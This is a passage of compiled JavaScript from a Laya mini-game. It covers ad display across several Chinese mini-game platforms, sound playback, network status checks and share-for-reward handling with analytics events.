                if (Laya.Browser.window.wx.getSystemInfoSync().screenHeight <= 812) {
                    realy = -1 * (80 / 145) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 100 + (80 / 145) * 667;
                }
                else {
                    realy = (10 / 84) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 20 - (10 / 84) * 812;
                }
                realX = 140;
            }
            else if (str == "sign") {
                realX = 90;
            }
            else if (str == "over") {
                if (Laya.Browser.window.wx.getSystemInfoSync().screenHeight <= 812) {
                    realy = -1 * (80 / 145) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 100 + (80 / 145) * 667;
                }
                else {
                    realy = (10 / 84) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 20 - (10 / 84) * 812;
                }
                realX = 130;
            }
            if (Laya.Browser.window.wx.createCustomAd) {
                this.custom2 = Laya.Browser.window.wx.createCustomAd({
                    adUnitId: 'adunit-199cd11638e39007',
                    style: {
                        left: Laya.Browser.window.wx.getSystemInfoSync().screenWidth / 2 - 25 + realX,
                        top: Laya.Browser.window.wx.getSystemInfoSync().screenHeight / 2 - 25 + realy,
                    }
                });
                this.custom2.show().then(() => {
                    this.custom2.show();
                });
                this.custom2.onLoad((res) => {
                    console.log(res, "加载原生广告成功2");
                });
                this.custom2.onError((err) => {
                    console.log('原生广告加载失败', err);
                });
            }
            Laya.timer.loop(Game.nativetime * 1000, this, this.refreshCustome2);
        }
        static refreshCustome2() {
            this.hideCustom2();
            this.createCustom2(this.customeStr2);
        }
        static hideCustom2() {
            Laya.timer.clear(this, this.refreshCustome2);
            if (this.custom2) {
                this.custom2.hide();
                this.custom2.destroy();
                this.custom2 = null;
            }
        }
    }
    MultiPlatforms.isoppoShow = true;
    MultiPlatforms.isloadcustomAd2 = false;
    MultiPlatforms.custome1Str = "";
    MultiPlatforms.customeStr2 = "";
    Game.MultiPlatforms = MultiPlatforms;
})(Game || (Game = {}));
const path = "sub-sound/res/";
var Game;
(function (Game) {
    class SoundManager {
        constructor() { }
        static playBGM(url, isloop = true) {
            if (url == "") {
                url = this.nowUrl;
                if (url == "") {
                    return;
                }
            }
            else {
                this.nowUrl = url;
            }
            if (isloop) {
                Laya.SoundManager.playMusic(path + url + ".mp3", 0);
            }
            else {
                Laya.SoundManager.playMusic(path + url + ".mp3", 1);
            }
        }
        static playSound(url, isloop = false) {
            let sound;
            if (isloop) {
                sound = Laya.SoundManager.playSound(path + url + ".mp3", 0);
            }
            else {
                sound = Laya.SoundManager.playSound(path + url + ".mp3");
            }
            return sound;
        }
        static stopBGM() {
            Laya.SoundManager.stopMusic();
        }
    }
    SoundManager.soundName = {
        Audio_bgm_game: "bgm_game",
        Audio_bgm_main: "bgm_main",
        Audio_vo_k1: "vo_k1",
        Audio_vo_k2: "vo_k2",
        Audio_vo_k3: "vo_k3",
        Audio_vo_k4: "vo_k4",
        Audio_vo_k5: "vo_k5",
        Audio_vo_k6: "vo_k6",
        Audio_vo_k7: "vo_k7",
        Audio_vo_k8: "vo_k8",
        Audio_vo_k9: "vo_k9",
        Audio_vo_k10: "vo_k10",
        Audio_ui_click: "ui_click",
        Audio_luck_draw: "luck_draw",
        Audio_boom: "boom",
        Audio_box_hit: "box_hit",
        Audio_change1: "change1",
        Audio_change2: "change2",
        Audio_coin: "coin",
        Audio_die: "die",
        Audio_guide_1: "guide_1",
        Audio_guide_2: "guide_2",
        Audio_ham_hit: "ham_hit",
        Audio_item_select: "item_select",
        Audio_open_door: "open_door",
        Audio_timing: "timing",
        Audio_start: "start",
        Audio_tree: "tree",
        Audio_win: "win",
        Audio_biu: "biu"
    };
    Game.SoundManager = SoundManager;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class CodeAB {
    }
    CodeAB.Test0 = 0;
    Game.CodeAB = CodeAB;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class NetWorkMar {
        static Init() {
            console.log(NetWorkMar.isConnected);
            var thisObj = null;
            if (window['wx'] && Game.GameCfg.plat === Game.PlatType.wx) {
                thisObj = window['wx'];
            }
            else if (window['tt'] && Game.GameCfg.plat === Game.PlatType.tt) {
                thisObj = window['tt'];
            }
            else if (window['qg'] && Game.GameCfg.plat === Game.PlatType.oppo || window['qg'] && Game.GameCfg.plat === Game.PlatType.vivo || window['qg'] && Game.GameCfg.plat === Game.PlatType.mz) {
                thisObj = window['qg'];
            }
            else if (window['swan'] && Game.GameCfg.plat == Game.PlatType.bd) {
                thisObj = window['swan'];
            }
            if (thisObj) {
                thisObj.onNetworkStatusChange(function (res) {
                    console.log(res.isConnected);
                    console.log(res.networkType);
                    NetWorkMar.curType = res.networkType;
                    NetWorkMar.isConnected = res.isConnected;
                });
            }
        }
    }
    NetWorkMar.isConnected = true;
    Game.NetWorkMar = NetWorkMar;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class PlatAdUtil {
        static isLong() {
            if (Laya.Browser.clientWidth / Laya.Browser.clientHeight >= 0.5)
                return false;
            return true;
        }
        static showBannerAd(justShowByLongPhone = false, destroy = true, isyujiazai = false) {
            if (Game.platMgr.plat.platType == Game.PlatType.web)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.bd)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                Game.MzAd.showBanner();
                return;
            }
            if (Laya.Browser.clientWidth / Laya.Browser.clientHeight >= 0.5 && justShowByLongPhone) {
                this.hideBannerAd();
                return;
            }
            if (this.banner && isyujiazai == false) {
                this.banner.show();
                return;
            }
            this.banner = k7.xsdk.agentManager.getAdsPlugin().showBanner(null, destroy);
            if (Game.GameCfg.plat != Game.PlatType.wx)
                return;
            if (isyujiazai) {
                this.banner.hide();
            }
        }
        static hideBannerAd(destroy = false) {
            if (Game.platMgr.plat.platType == Game.PlatType.web)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.bd)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.wx) {
                destroy = true;
            }
            if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                Game.MzAd.hideBanner();
                return;
            }
            if (this.banner) {
                if (destroy) {
                    this.banner.destroy();
                }
                else {
                    this.banner.hide();
                }
            }
            if (Game.GameCfg.plat != Game.PlatType.wx)
                return;
            this.showBannerAd(false, false, true);
        }
        static hasVideoAd() {
            if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                return Game.MzAd.hasVideoAd();
            }
            else {
                return k7.xsdk.agentManager.getAdsPlugin().hasRewardedVideoAd();
            }
        }
        static showVideoAd(rId, success, fail, complete) {
            if (!Game.NetWorkMar.isConnected) {
                Game.platMgr.plat.platFunc['showModal']({
                    title: "没有网络了",
                    content: "请联网后重试",
                    showCancel: false,
                    cancelText: '返回',
                    cancelColor: '#666666',
                    confirmText: '确定',
                    fail: function () {
                        if (!!fail)
                            fail();
                    },
                    success: function (res) {
                        if (res.confirm) {
                            if (!!fail)
                                fail();
                        }
                    }
                });
                return;
            }
            k7.xsdk.agentManager.getAnalyticsGroup().onVideoWatch({
                video_scene_id: rId + "",
                video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                video_show_success: true
            });
            if (Game.platMgr.plat.platType == Game.PlatType.web) {
                if (confirm('看广告?')) {
                    k7.xsdk.agentManager.getAnalyticsGroup().onVideoComplete({
                        video_scene_id: rId + "",
                        video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                        video_watch_success: true
                    });
                    if (!!success)
                        success();
                }
                else {
                    k7.xsdk.agentManager.getAnalyticsGroup().onVideoComplete({
                        video_scene_id: rId + "",
                        video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                        video_watch_success: false
                    });
                    if (!!fail)
                        fail();
                }
                if (!!complete)
                    complete();
            }
            else {
                Game.SoundManager.stopBGM();
                if (Game.recordMgr.isSupportRecord() && Game.recordMgr.isRecord) {
                    Game.recordMgr.pauseGameRecorder();
                }
                if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                    Game.MzAd.showVedio(() => {
                        k7.xsdk.agentManager.getAnalyticsGroup().onVideoComplete({
                            video_scene_id: rId + "",
                            video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                            video_watch_success: true
                        });
                        if (!!success)
                            success();
                        Game.SoundManager.playBGM("");
                        if (Game.recordMgr.isSupportRecord() && Game.recordMgr.isPause) {
                            Game.recordMgr.resumeGameRecorder();
                        }
                    }, () => {
                        Game.MultiPlatforms.showToast('暂无广告,请稍后再试!');
                    });
                }
                else {
                    k7.xsdk.agentManager.getAdsPlugin().showRewardedVideoAd({
                        unitId: '',
                        multiton: true,
                        close: (res) => {
                            if (res.isFinished) {
                                k7.xsdk.agentManager.getAnalyticsGroup().onVideoComplete({
                                    video_scene_id: rId + "",
                                    video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                                    video_watch_success: true
                                });
                                if (!!success)
                                    success();
                            }
                            else {
                                k7.xsdk.agentManager.getAnalyticsGroup().onVideoComplete({
                                    video_scene_id: rId + "",
                                    video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                                    video_watch_success: false
                                });
                                if (!!fail)
                                    fail();
                            }
                            if (!!complete)
                                complete();
                            Game.SoundManager.playBGM("");
                            if (Game.recordMgr.isSupportRecord() && Game.recordMgr.isPause) {
                                Game.recordMgr.resumeGameRecorder();
                            }
                            this.videoTime = Game.TimeTools.getCrtTime();
                            if (Game.platMgr.plat.platType == Game.PlatType.tt) {
                                Game.platMgr.plat._lastInterAdTime = this.videoTime;
                            }
                        }
                    });
                }
            }
        }
        static createVideoAd() {
        }
        static loadInterAd() {
            if (Game.platMgr.plat.platType == Game.PlatType.web)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.bd)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                Game.MzAd.loadInsert();
            }
            else {
                k7.xsdk.agentManager.getAdsPlugin().preloadInterstitialAd({
                    unitId: "",
                    close: (res) => {
                        if (!!close)
                            close();
                    }
                });
            }
        }
        static showInterAd(close) {
            if (Game.platMgr.plat.platType == Game.PlatType.web)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.bd)
                return;
            if (Game.platMgr.plat.platType == Game.PlatType.vivo) {
                Game.VivoPlat.createInterstitialAd();
                return;
            }
            if (Laya.Browser.window.qq) {
                this.showInterstitialAd();
                return;
            }
            k7.xsdk.agentManager.getAdsPlugin().showInterstitial({
                unitId: "",
                close: (res) => {
                    if (!!close)
                        close();
                    PlatAdUtil.loadInterAd();
                }
            });
        }
        static showGameBannerAd() {
        }
        static hideGameBannerAd() {
        }
        static showPortalAd() {
        }
        static hidePortalAd() {
        }
        static loadNativeAd(success, fail, idx) {
        }
        static clickNativeAd() {
        }
        static disposeNativeAd() {
        }
        static showAppBoxAd(close) {
        }
        static showGridAd() {
        }
        static hideNavigateSettle() {
        }
        static showNavigateSettle(type, x, y) {
        }
        static installShortcut(success, fail) {
        }
        static createInterstitialAd() {
            if (Laya.Browser.window.qq && Laya.Browser.window.qq.createInterstitialAd) {
                if (this.interstitialAd == null) {
                    this.interstitialAd = Laya.Browser.window.qq.createInterstitialAd({ adUnitId: "bb0fe95b7f1af04ca5489a5a03297b5d" });
                    this.interstitialAd.onLoad(() => {
                        console.log("插屏广告加载成功");
                    });
                    this.interstitialAd.onError((err) => {
                        console.log("插屏广告加载失败", err);
                    });
                }
            }
        }
        static showInterstitialAd() {
            if (this.interstitialAd && this.interstitialAd.show) {
                this.interstitialAd.show();
            }
            else {
                this.createInterstitialAd();
            }
        }
    }
    PlatAdUtil.videoTime = 0;
    Game.PlatAdUtil = PlatAdUtil;
})(Game || (Game = {}));
var Game;
(function (Game) {
    Game.shareList = [
        { uid: '001', title: '[有人@你]，一锤一个小朋友！', imageUrl: '' },
        { uid: '002', title: '[有人@你]，求锤得锤，撸起袖子加油干!', imageUrl: '' },
        { uid: '003', title: '[有人@你]，小锤锤捶你胸口！', imageUrl: '' },
        { uid: '004', title: '[有人@你]，一锤一个小朋友!', imageUrl: '' },
        { uid: '005', title: '[有人@你]，求锤得锤，撸起袖子加油干！', imageUrl: '' }
    ];
    class PlatShareUtil {
        static init() {
            if (Game.platMgr.plat.platType != Game.PlatType.wx)
                return;
            wx['onShow'](() => {
                if (!this.readyShare)
                    return;
                if (this.shareCount >= this.shareMinCount) {
                    this.shareSuccess();
                }
                else {
                    var dt = Date.now() - this.shareStartTime;
                    if (this.shareTotalTime <= 0) {
                        this.shareTotalTime = dt;
                    }
                    else {
                        this.shareTotalTime += dt;
                    }
                    console.log('分享到现在总共已经过去了', this.shareTotalTime, 'ms');
                    if (this.shareTotalTime < this.shareMinTime * 1000) {
                        if (!this.shareFailTips || !this.shareFailTips.length) {
                            this.shareFail();
                        }
                        else {
                            let idx = Math.floor(Math.random() * this.shareFailTips.length);
                            this.showModal(this.shareFailTips[idx]);
                            return;
                        }
                    }
                    else {
                        this.shareSuccess();
                    }
                }
                Game.SoundManager.playBGM("");
            });
        }
        static share(rId, success, fail) {
            if (!Game.NetWorkMar.isConnected) {
                Game.platMgr.plat.platFunc['showModal']({
                    title: "没有网络了",
                    content: "请联网后重试",
                    showCancel: false,
                    cancelText: '返回',
                    cancelColor: '#666666',
                    confirmText: '确定',
                    fail: function () {
                        if (!!fail)
                            fail();
                    },
                    success: function (res) {
                        if (res.confirm) {
                            if (!!fail)
                                fail();
                        }
                    }
                });
                return;
            }
            this.shareTitle = null;
            this.rId = rId;
            if (success)
                this.success = success;
            if (fail)
                this.fail = fail;
            let idx = Math.floor(Math.random() * Game.shareList.length);
            this.idx = idx;
            let channel = "";
            let desc = "";
            let extra = {};
            k7.xsdk.agentManager.getAnalyticsGroup().onShareOpen({
                share_scene_id: rId + "",
                share_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                share_title: this.shareTitle ? this.shareTitle : Game.shareList[idx].title + "",
                share_id: Game.shareList[idx].uid + ""
            });
            if (Game.platMgr.plat.platType == Game.PlatType.tt && Game.recordMgr.getHasRecord()) {
                let videoTopicsList = ['小游戏'];
                channel = 'video';
                desc = '';
                extra = {
                    videoPath: Game.recordMgr.tempRecordUrl,
                    videoTopics: videoTopicsList, hashtag_list: videoTopicsList,
                    video_title: ''
                };
            }
            this.readyShare = true;
            this.shareStartTime = Date.now();
            this.shareCount++;
            if (Game.platMgr.plat.platType == Game.PlatType.web) {
                if (confirm('是否分享?')) {
                    k7.xsdk.agentManager.getAnalyticsGroup().onShareComplete({
                        share_scene_id: rId + "",
                        share_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                        share_title: this.shareTitle ? this.shareTitle : Game.shareList[idx].title + "",
                        share_success: true,
                        share_id: Game.shareList[idx].uid + ""
                    });
                    if (!!success)
                        success();
                }
                else {
                    k7.xsdk.agentManager.getAnalyticsGroup().onShareComplete({
                        share_scene_id: rId + "",
                        share_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                        share_title: this.shareTitle ? this.shareTitle : Game.shareList[idx].title + "",
                        share_success: false,
                        share_id: Game.shareList[idx].uid + ""
                    });
                    if (!!fail)
                        fail();
                }
                return;
            }
            k7.xsdk.agentManager.getSharePlugin().share({
                title: this.shareTitle ? this.shareTitle : Game.shareList[idx].title,
                imageUrl: Game.shareList[idx].imageUrl,
                query: 'shareId=' + Game.shareList[idx].uid,
                channel: channel,
                desc: desc,
                extra: extra,
                success: () => {
                    k7.xsdk.agentManager.getAnalyticsGroup().onShareComplete({
                        share_scene_id: rId + "",
                        share_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                        share_title: this.shareTitle ? this.shareTitle : Game.shareList[idx].title + "",
                        share_success: true,
                        share_id: Game.shareList[idx].uid + ""
                    });
                    if (!!success)
                        success();
                },
                fail: () => {
                    k7.xsdk.agentManager.getAnalyticsGroup().onShareComplete({
                        share_scene_id: rId + "",
                        share_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                        share_title: this.shareTitle ? this.shareTitle : Game.shareList[idx].title + "",
                        share_success: false,
                        share_id: Game.shareList[idx].uid + ""
                    });
                    if (!!fail)
                        fail();
                }
            });
        }
        static shareSuccess() {
            k7.xsdk.agentManager.getAnalyticsGroup().onShareComplete({
                share_scene_id: this.rId + "",
                share_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                share_title: this.shareTitle ? this.shareTitle : Game.shareList[this.idx].title + "",
                share_success: true,
                share_id: Game.shareList[this.idx].uid + ""
            });
            if (!!this.success)
                this.success();
            this.readyShare = false;
            this.shareTotalTime = 0;
            this.shareCount = 0;
            this.success = null;
            this.fail = null;
        }
        static shareFail() {
            k7.xsdk.agentManager.getAnalyticsGroup().onShareComplete({
                share_scene_id: this.rId + "",
                share_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                share_title: this.shareTitle ? this.shareTitle : Game.shareList[this.idx].title + "",
                share_success: false,
                share_id: Game.shareList[this.idx].uid + ""
            });
            if (!!this.fail)
                this.fail();
            this.readyShare = false;
            this.success = null;
            this.fail = null;
        }
        static showModal(data) {
            let _this = this;
            wx['showModal']({
                title: data.title,
                content: data.content,
                showCancel: true,
                cancelText: '返回',
                cancelColor: '#666666',
                confirmText: '去分享',
                fail: function () {
                    _this.shareFail();
                },
                success: function (res) {
                    if (res.confirm) {
                        _this.share(_this.rId);
                    }
                    else if (res.cancel) {
                        _this.shareFail();
                    }
                }
            });
        }
    }
    PlatShareUtil.shareFailTips = [{ title: "分享失败", content: "请尝试分享到不同的群" }, { title: "分享失败", content: "请尝试重新分享" }];
    PlatShareUtil.shareTotalTime = 0;
    PlatShareUtil.shareStartTime = 0;
    PlatShareUtil.shareCount = 0;
    PlatShareUtil.shareMinTime = 3;
    PlatShareUtil.shareMinCount = 2;
    PlatShareUtil.readyShare = false;
    Game.PlatShareUtil = PlatShareUtil;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class Pt4399Plat {
        constructor(platType) {
            this._platType = 'pt4399';
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['h5api'];
        }
        init() {
            fairygui.UIConfig.packageFileExtension = 'fui';
            this.setRewardPoint();
            this.initAdInfo();
            k7.getFairyInstence(Game.MyHomeScene).displayObject.addChild(WaterMark.getWaterMark(480, 80));
            k7.getFairyInstence(Game.GameScene).displayObject.addChild(WaterMark.getWaterMark(480, 80));
            Laya.timer.callLater(this, () => {
                if (GRoot.inst.width <= 720) {
                    Laya.stage.scaleMode = 'fixedwidth';
                    ConfigMgr.fixedWidth = 1;
                }
                Laya.stage.bgColor = '#000000';
            });
        }
        setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
        initAdInfo() {
            Game.rpMgr.getReward = (rId, success, fail, complete) => 
            {
                k7.xsdk.agentManager.getAnalyticsGroup().onVideoWatch({
                    video_scene_id: rId + "",
                    video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                    video_show_success: true
                });
                Game.SoundManager.stopBGM();
                gameapi.playReward((succeed)=>{
                    //console.log("11111111111");
                    if(succeed){
                        if (!!success)
                            success();
                            k7.xsdk.agentManager.getAnalyticsGroup().onVideoComplete({
                                video_scene_id: rId + "",
                                video_scene_name: Game.rpMgr.crtRewardItem ? Game.rpMgr.crtRewardItem.name : '',
                                video_watch_success: true
                            });
                        if (!!complete)
                            complete();
                            Game.SoundManager.playBGM("");
                   }
                });

           
        };
            Game.PlatAdUtil.showBannerAd = () => { };
            Game.PlatAdUtil.hideBannerAd = () => { };
            Game.PlatAdUtil.loadInterAd = () => { };
            Game.PlatAdUtil.showInterAd = () => { };
        }
    }
    Game.Pt4399Plat = Pt4399Plat;
    class WaterMark {
        static getWaterMark(x, y) {
            let s = new Laya.Text();
            s.fontSize = 70;
            s.text = '';
            s.color = '#666666';
            s.x = x;
            s.y = y;
            return s;
        }
        static showWaterMark(pos) {
            if (!this._s) {
                this._s = new Laya.Text();
                this._s.fontSize = 70;
                this._s.text = '';
                this._s.color = '#666666';
            }
            this._s.x = pos[0];
            this._s.y = pos[1];
            this._s.visible = true;
            Laya.stage.addChild(this._s);
        }
        static hideWaterMark() {
            if (this._s)
                this._s.visible = false;
        }
    }
    Game.WaterMark = WaterMark;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class BdPlat {
        constructor(platType) {
            this._platType = 'bd';
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['swan'];
        }
        init() {
            window['swan']['onHide'](() => {
                Game.SoundManager.stopBGM();
            });
            window['swan']['onShow'](() => {
                Game.SoundManager.playBGM("");
            });
            this._setRewardPoint();
            Game.PlatAdUtil.loadInterAd();
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
        login(loginObj) {
        }
    }
    Game.BdPlat = BdPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class HWNavLdrBar extends GComponent {
        onConstruct() {
            super.onConstruct();
            this.m_icon = this.getChild('icon').asLoader;
            this.m_btnClose = this.getChild('btnClose').asButton;
            this.visible = false;
            mvc.on(GameEvt.NATIVEAD_REFRESH, this, (data, firstIcon = true) => {
                this.setData(data, firstIcon);
            });
            mvc.on(GameEvt.LOADNATIVE_FAIL, this, () => {
                this.visible = false;
            });
            this.m_icon.onClick(this, () => {
                if (this._adInfo) {
                    Game.PlatAdUtil.clickNativeAd();
                }
            });
            this.m_btnClose.onClick(this, () => {
                this.visible = false;
                mvc.send(GameEvt.NATIVEAD_HIDE);
            });
            this.setData(Game.nativeData);
        }
        setData(data, firstIcon = true) {
            this._adInfo = data;
            console.log('adinfo', this._adInfo);
            if (!this._adInfo) {
                this.visible = false;
                return;
            }
            if (firstIcon) {
                if (this._adInfo.icon) {
                    this.m_icon.url = this._adInfo.icon;
                    this.visible = true;
                }
                else if (this._adInfo.imgUrlList && this._adInfo.imgUrlList[0]) {
                    this.m_icon.url = this._adInfo.imgUrlList[0];
                    this.visible = true;
                }
            }
            else {
                if (this._adInfo.imgUrlList && this._adInfo.imgUrlList[0]) {
                    this.m_icon.url = this._adInfo.imgUrlList[0];
                    this.visible = true;
                }
                else if (this._adInfo.icon) {
                    this.m_icon.url = this._adInfo.icon;
                    this.visible = true;
                }
            }
            this.getChild('title').asTextField.text = this._adInfo.title;
            this.getChild('source').asTextField.text = this._adInfo.source;
        }
    }
    HWNavLdrBar.URL = 'ui://6v1f57qyq42lat6bj';
    Game.HWNavLdrBar = HWNavLdrBar;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class HwPlat {
        constructor(platType) {
            this._platType = 'huawei';
            this.refreshTime = 60;
            this.nativeObject = null;
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['qg'];
        }
        init() {
            window['qg']['onHide'](() => {
                Game.SoundManager.stopBGM();
            });
            window['qg']['onShow'](() => {
                Game.SoundManager.playBGM("");
            });
            this._setRewardPoint();
            Game.PlatAdUtil.loadInterAd = function () {
                return;
            };
            Game.PlatAdUtil.showInterAd = function (close) {
                return;
            };
            Game.PlatAdUtil.loadNativeAd = function (success, fail, idx) {
                if (window['qg'].getSystemInfoSync().platformVersionCode < 1075) {
                    if (!!fail)
                        fail();
                    return;
                }
                Game.platMgr.plat.nativeObject = k7.xsdk.agentManager.getAdsPlugin().loadNativeAd({
                    unitId: "",
                    success,
                    fail
                });
            };
            Game.PlatAdUtil.clickNativeAd = function () {
                if (window['qg'].getSystemInfoSync().platformVersionCode < 1075)
                    return;
                Game.platMgr.plat.nativeObject && Game.platMgr.plat.nativeObject.reportAdClick();
                Game.PlatAdUtil.loadNativeAd((res) => {
                    mvc.send(GameEvt.NATIVEAD_REFRESH, res);
                }, () => {
                    mvc.send(GameEvt.LOADNATIVE_FAIL);
                });
            };
            k7.xsdk.agentManager.getAdsPlugin().preloadRewardedVideoAd({ unitId: '' });
            mvc.on("VideoError", this, () => {
                Game.MultiPlatforms.showToast("暂无广告，敬请期待！");
            });
        }
        refreshNativeAd() {
            Game.PlatAdUtil.loadNativeAd((res) => {
                Game.nativeData = res;
                mvc.send(GameEvt.NATIVEAD_REFRESH, res);
            }, () => {
                mvc.send(GameEvt.LOADNATIVE_FAIL);
            });
            Laya.timer.once(this.refreshTime * 1000, this, this.refreshNativeAd);
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
        login(loginObj) {
        }
    }
    Game.HwPlat = HwPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MzAd {
        static showInsert() {
            console.log('显示插屏广告1');
            if (this.insertAd) {
                console.log('显示插屏广告2');
                this.insertAd.show();
            }
            else {
                console.log('显示插屏广告3');
                this.loadInsert();
            }
        }
        static loadInsert() {
            var insertAd = window['qg'].createInsertAd({
                adUnitId: MzAd.insertId
            });
            insertAd.onClose(function () {
                console.log("insert 广告加载关闭");
                MzAd.hideInsert();
            });
            insertAd.onError(function (err) {
                console.log("insert 广告加载失败");
            });
            insertAd.onLoad(function () {
                console.log("insert 广告加载成功");
                MzAd.insertAd = insertAd;
            });
            insertAd.load();
        }
        static hideInsert() {
            if (MzAd.insertAd) {
                console.log('移除监听');
                MzAd.insertAd.offLoad();
                MzAd.insertAd.offError();
                MzAd.insertAd = null;
                Laya.timer.once(15000, this, () => {
                    MzAd.loadInsert();
                });
            }
        }
        static showVedio(suc, fail) {
            var videoAd = window['qg'].createRewardedVideoAd({
                adUnitId: MzAd.videoId
            });
            videoAd.load();
            videoAd.onLoad(function () {
                MzAd.videoErr = false;
                console.log("激励视频加载成功");
                MzAd.videoAd = videoAd;
                videoAd.show();
            });
            videoAd.onClose(() => {
                console.log('激励视频观看完成');
                suc && suc();
                MzAd.videoAd = null;
            });
            videoAd.onError(function (err) {
                console.log(err);
                console.log('激励视频error');
                MzAd.videoErr = true;
                fail && fail();
            });
        }
        static showBanner() {
            if (this.banner) {
                this.banner.show();
            }
        }
        static createBanner() {
            if (Laya.Browser.window.qg) {
                let self = this;
                var screenHeight = Laya.Browser.window.qg.getSystemInfoSync().screenHeight;
                var screenWidth = Laya.Browser.window.qg.getSystemInfoSync().screenWidth;
                this.banner = Laya.Browser.window.qg.createBannerAd({
                    adUnitId: this.bannerId,
                    style: {
                        left: 0,
                        top: screenHeight - screenWidth / 6.7,
                        width: screenWidth,
                        height: screenWidth / 6.7
                    }
                });
                this.banner.onLoad(function () {
                    console.log("banner 广告加载成功");
                });
                this.banner.onResize((res) => {
                    console.log("Banner 尺寸改变");
                    let screenHeight = Laya.Browser.window.qg.getSystemInfoSync().screenHeight;
                    self.banner.style.top = screenHeight - res.height;
                    self.banner.style.left = 0;
                    self.banner.style.width = res.width;
                    self.banner.style.height = res.height;
                });
            }
        }
        static hideBanner() {
            console.log('隐藏banner');
            if (this.banner && this.banner.destroy) {
                this.banner.destroy();
                this.createBanner();
            }
        }
        static hasVideoAd() {
            if (this.videoAd) {
                return true;
            }
            return false;
        }
        static showToast(text) {
            if (Laya.Browser.window.qg) {
                Laya.Browser.window.qg.showToast({
                    message: text,
                    duration: 0
                });
            }
        }
        static SetVibration(_isShort = true, callBack = null) {
            if (Laya.Browser.window.qg) {
                if (_isShort) {
                    if (Laya.Browser.window.qg.vibrateShort)
                        Laya.Browser.window.qg.vibrateShort({ success: () => { } });
                }
                else {
                    if (Laya.Browser.window.qg.vibrateLong)
                        Laya.Browser.window.qg.vibrateLong({ success: () => { } });
                }
            }
        }
    }
    MzAd.banner = null;
    MzAd.videoAd = null;
    MzAd.insertAd = null;
    MzAd.bannerId = 'rNn0TzmN';
    MzAd.insertId = 'tEcgRCGz';
    MzAd.videoId = 'uhlEDQ3g';
    MzAd.insertLoading = false;
    MzAd.videoErr = false;
    Game.MzAd = MzAd;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MzPlat {
        constructor(platType) {
            this._platType = 'mz';
            this._lastInterAdTime = 0;
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['qg'];
        }
        init() {
            window['qg']['onHide'](() => {
                Game.SoundManager.stopBGM();
            });
            window['qg']['onShow'](() => {
                Game.SoundManager.playBGM("");
            });
            Game.recordMgr.initManager();
            this._setRewardPoint();
            Game.PlatAdUtil.showInterAd = function (close) {
                console.log("准备显示插屏");
                if (getTimer() <= 30000) {
                    console.log("游戏刚开始一段时间不允许展示插屏");
                    return;
                }
                if (Game.TimeTools.getCrtTime() - Game.platMgr.plat._lastInterAdTime <= 30 * 1000) {
                    console.log("距离上次显示插屏不到30秒，不能显示");
                    return;
                }
                Game.platMgr.plat._lastInterAdTime = Game.TimeTools.getCrtTime();
                Game.MzAd.showInsert();
            };
            Game.PlatAdUtil.loadInterAd();
            Game.MzAd.createBanner();
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
        isSupportMoreGame() {
            return window['qg'] && window['qg'].getSystemInfoSync().platform != "ios";
        }
        login(loginObj) {
        }
        showMoreGamesModal() {
            if (!this.isSupportMoreGame())
                return;
        }
    }
    MzPlat.isInsertAdLoad = false;
    Game.MzPlat = MzPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class NavLdrBar extends GComponent {
        onConstruct() {
            super.onConstruct();
